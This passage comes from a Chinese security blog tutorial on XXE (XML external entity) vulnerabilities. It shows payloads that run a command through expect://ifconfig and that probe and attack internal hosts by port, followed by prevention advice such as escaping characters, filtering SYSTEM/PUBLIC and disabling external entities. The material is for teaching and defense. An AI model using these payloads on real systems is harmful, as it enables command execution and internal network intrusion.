+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://ifconfig"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>(3) 探测内网端口</em></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://172.16.9.200:22"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/4.png" alt="enter description here"><br><em>(4) 攻击内网网站</em></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://172.16.9.200:22"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/a-running-snail2333/blog.github.io/master/picture/xxe/5.png" alt="enter description here"></p>
+<h1 id="0x05-XML注入预防"><a href="#0x05-XML注入预防" class="headerlink" title="0x05 XML注入预防"></a><strong>0x05 XML注入预防</strong></h1><p>1、预定义字符转义：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">&lt;       <span class="variable">&amp;lt</span>;</span></span><br><span class="line"><span class="params">&gt;</span>       <span class="variable">&amp;gt</span>;</span><br><span class="line">&amp;       <span class="variable">&amp;amp</span>;</span><br><span class="line">‘      <span class="variable">&amp;apos</span>;</span><br><span class="line">“      <span class="variable">&amp;quot</span>;</span><br></pre></td></tr></table></figure>
+<p>2、过滤用户提交的XML数据，关键词：，SYSTEM和PUBLIC；<br>3、禁用外部实体：libxml_disable_entity_loader(true);</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 2072622989@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>web安全-xxe漏洞详解</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="一坨奔跑的蜗牛">一坨奔跑的蜗牛</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-04-01, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2019-04-01, 12:50:28</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/BetaSecLab.github.io/2019/04/01/web%E5%AE%89%E5%85%A8-xxe/" title="web安全-xxe漏洞详解">http://yoursite.com/2019/04/01/web%E5%AE%89%E5%85%A8-xxe/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2016-2019 snail</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/BetaSecLab.github.io/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/BetaSecLab.github.io/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#kali','#labs','#-web安全','#内网渗透','#-内网渗透','#-护网行动','#随笔',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/BetaSecLab.github.iohttps://i.loli.net/2019/07/22/5d3521411f3f169375.png");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
